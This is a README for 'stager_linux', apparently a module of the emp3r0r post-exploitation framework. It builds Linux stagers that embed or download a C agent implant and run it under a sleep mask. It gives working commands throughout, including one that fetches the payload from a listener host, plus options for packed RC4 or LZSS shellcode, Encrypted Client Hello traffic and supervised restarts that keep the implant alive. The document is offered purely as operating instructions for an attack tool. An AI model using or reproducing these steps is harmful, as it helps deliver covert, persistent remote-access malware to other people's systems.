# stager_linux

Builds a Linux stager for a C agent PIC. The stager either embeds the PIC or
downloads it from a payload listener at run time, then starts it under a sleep
mask.

Run it from the operator console.

## Before you start

- Build the payload with `generate_c --cc <host> --format shellcode`.
- For download mode, serve that `.bin` with `emp3r0r-listener` and use the same
  `--payload-key` on both sides.

## Usage

```bash
stager_linux [options]
```

Embed the payload, so the stager needs no download at run time:

```bash
stager_linux --format executable --agent-pic /path/to/agent.bin
```

Download the payload from a listener:

```bash
stager_linux --format executable --transport http \
  --payload-host 203.0.113.10 --payload-port 8000 --payload-path / \
  --payload-key 'shared-key'
```

Build a shared object or packed shellcode:

```bash
stager_linux --format so --agent-pic /path/to/agent.bin
stager_linux --format packed --agent-pic /path/to/agent.bin --unpacker lzss
```

## Options

| Option | Default | Use |
| --- | --- | --- |
| `--format` | `raw` | `so` shared library, `executable` ELF, `raw` shellcode, `packed` self-unpacking shellcode |
| `--transport` | `http` | `http`, `tcp`, `udp`, `libcurl`, `libssl` |
| `--agent-pic` | empty | Embed this C agent PIC; when set, the download options are ignored |
| `--payload-host` | empty | Payload listener host |
| `--payload-port` | `8000` | Payload listener port |
| `--payload-path` | `/` | HTTP request path; HTTP transports only |
| `--payload-key` | empty | Listener passphrase; must match the listener |
| `--unpacker` | `rc4` | `packed` only: `rc4` or `lzss` |
| `--dynload-mode` | `public` | `public` for glibc 2.34+, `libc_dl` for older glibc |
| `--hash-style` | `auto` | `auto`, `sysv`, or `gnu` |
| `--ech` | `off` | `libssl` only: `on` or `off` |
| `--ech-config` | empty | `libssl` only: base64 ECHConfigList |
| `--supervise` | `off` | Run the agent in a child process and keep its identity across restarts; requires a stager-built agent |
| `--supervise-sleep-min` | `5` | Minimum supervisor sleep in seconds |
| `--supervise-sleep-max` | `30` | Maximum supervisor sleep in seconds |

Use `emp3r0r-listener --stager /path/to/agent.bin --port 8000 --key 'shared-key' --type http`
to serve a download payload.

The build prints the generated artifact path: `stager.bin` for `raw`,
`stager` for `executable`, `stager.so` for `so`, or `stager-packed.bin` for
`packed`.
